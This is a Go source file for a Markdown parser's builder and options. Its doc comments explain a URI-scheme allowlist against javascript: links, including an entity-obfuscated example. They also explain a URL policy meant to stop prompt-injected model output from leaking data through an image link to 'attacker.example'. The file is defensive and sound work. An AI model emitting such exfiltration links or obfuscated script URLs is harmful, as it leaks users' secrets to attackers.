package mdflow

import (
	"github.com/Wenrh2004/mdflow/extension"
	internalrawhtml "github.com/Wenrh2004/mdflow/internal/rawhtml"
	"github.com/Wenrh2004/mdflow/parser"
	"github.com/Wenrh2004/mdflow/renderer"
	"github.com/Wenrh2004/mdflow/renderer/html"
)

// Builder assembles a Parser.
//
// It exists because configuration has an order and options do not. An option
// that *performs* its work as it runs cannot commute with one that replaces the
// thing it worked on: supplying a renderer used to discard every capability
// already registered against the old one, and WithHTML5 landed or did not
// depending on where it sat in the argument list.
//
// So nothing here configures anything. Each method records an intention, and
// [Builder.Build] wires them once, in a fixed order:
//
//	rules and renderer settle → capabilities apply → output policies apply → renderer tweaks apply
//
// [Option] is a function over a Builder and [New] delegates here, so both
// spellings share one implementation and neither can drift.
type Builder struct {
	rules  *parser.RuleSet
	rend   renderer.Renderer
	base   extension.Extension // the starting set, replaced by Only
	extra  []extension.Extension
	output []extension.Extension
	tweaks []func(renderer.Renderer)
}

// NewBuilder starts a Builder with the complete CommonMark profile. Raw HTML is
// composed as a safely-rendered extension: parser.New and the core renderers
// remain HTML-blind, while the one-call facade still implements the protocol.
// Use [Builder.Only] to replace that default profile.
func NewBuilder() *Builder { return &Builder{base: internalrawhtml.RawHTML} }

// Rules supplies the rule set to build on, instead of the CommonMark default.
func (b *Builder) Rules(rs *parser.RuleSet) *Builder { b.rules = rs; return b }

// Renderer supplies the renderer, instead of the default HTML one.
func (b *Builder) Renderer(r renderer.Renderer) *Builder { b.rend = r; return b }

// Use adds capabilities on top of whatever set is already selected.
func (b *Builder) Use(exts ...extension.Extension) *Builder {
	b.extra = append(b.extra, exts...)
	return b
}

// Only replaces the default capability set with exactly the ones named,
// discarding capabilities added through Use. Renderer settings and output-only
// policies are independent of syntax selection. Only() with no arguments
// builds a parser with no extensions at all.
func (b *Builder) Only(exts ...extension.Extension) *Builder {
	b.base = extension.Set(exts)
	b.extra = nil
	return b
}

// With applies options, so the two spellings compose.
func (b *Builder) With(opts ...Option) *Builder {
	for _, o := range opts {
		o(b)
	}
	return b
}

// tweak records a renderer adjustment to run after every capability has been
// wired, so it always sees the renderer that is actually in use.
func (b *Builder) tweak(f func(renderer.Renderer)) { b.tweaks = append(b.tweaks, f) }

// Build wires everything recorded so far and returns the Parser.
func (b *Builder) Build() *Parser {
	spec := &Spec{}
	if b.rules == nil {
		spec.Rules = parser.New()
	} else {
		// Capabilities register by mutating a rule set. Clone caller-owned input so
		// building one profile cannot contaminate a later WithOnly profile that
		// starts from the same rules.
		spec.Rules = b.rules.Clone()
	}
	if b.rend == nil {
		spec.Renderer = html.NewRenderer()
	} else {
		// Output capabilities likewise install handlers on the renderer. Honour its
		// Cloner seam before applying safe/unsafe policy so one parser can never
		// rewrite another parser's dispatch tables through a shared input pointer.
		spec.Renderer = renderer.Clone(b.rend)
	}
	if b.base != nil {
		spec.apply(b.base)
	}
	spec.apply(b.extra...)
	for _, policy := range b.output {
		policy.Render(spec.Renderer)
	}
	for _, t := range b.tweaks {
		t(spec.Renderer)
	}
	return newParser(spec, nil, 0)
}

// ---- options ----

// Option records one configuration choice on a [Builder].
type Option func(*Builder)

// WithExtensions adds capabilities to the default set.
func WithExtensions(exts ...extension.Extension) Option {
	return func(b *Builder) { b.Use(exts...) }
}

// WithOutput applies only the rendering half of each capability, after the
// selected syntax capabilities. It is not cleared by [WithOnly], which lets an
// output policy commute with syntax selection. A policy has no effect unless
// the selected syntax emits nodes it handles.
func WithOutput(policies ...extension.Extension) Option {
	return func(b *Builder) { b.output = append(b.output, policies...) }
}

// WithOnly replaces the default capability set with exactly the ones named.
func WithOnly(exts ...extension.Extension) Option {
	return func(b *Builder) { b.Only(exts...) }
}

// WithRules supplies the rule set to build on.
func WithRules(rs *parser.RuleSet) Option { return func(b *Builder) { b.Rules(rs) } }

// WithRenderer replaces the renderer wholesale.
func WithRenderer(r renderer.Renderer) Option { return func(b *Builder) { b.Renderer(r) } }

// WithHTML5 emits `<br>`/`<hr>`/`<img>` instead of their self-closing XHTML
// spellings. It applies to the HTML renderer and is ignored by any other.
func WithHTML5() Option {
	return func(b *Builder) {
		b.tweak(func(r renderer.Renderer) {
			if h, ok := r.(*html.Renderer); ok {
				h.XHTML = false
			}
		})
	}
}

// WithSafeLinks filters link and image destinations to a safe URI-scheme
// allowlist (http, https, mailto, tel, and any relative reference), rendering an
// empty destination for javascript:, data:, vbscript: and every other scheme.
// The check runs on the destination after entity decoding, so entity-obfuscated
// schemes like java&#115;cript: are caught too.
//
// It is opt-in: the default profile stays byte-for-byte CommonMark, leaving URI
// schemes unfiltered. Enable it when rendering untrusted, user-generated
// Markdown. It applies to the HTML renderer and is ignored by any other.
func WithSafeLinks() Option {
	return func(b *Builder) {
		b.tweak(func(r renderer.Renderer) {
			if h, ok := r.(*html.Renderer); ok {
				h.SafeLinks = true
			}
		})
	}
}

// WithURLPolicy vets every link and image destination with policy before it is
// written, after the WithSafeLinks scheme check when both are set. Use it to
// stop model-generated Markdown from loading remote images — the channel a
// prompt-injected ![](https://attacker.example/?q=secret) leaks data through:
//
//	md := mdflow.New(mdflow.WithURLPolicy(html.AllowImageHosts("cdn.example.com")))
//
// It applies to the HTML renderer and is ignored by any other.
func WithURLPolicy(policy html.URLPolicy) Option {
	return func(b *Builder) {
		b.tweak(func(r renderer.Renderer) {
			if h, ok := r.(*html.Renderer); ok {
				h.URLPolicy = policy
			}
		})
	}
}
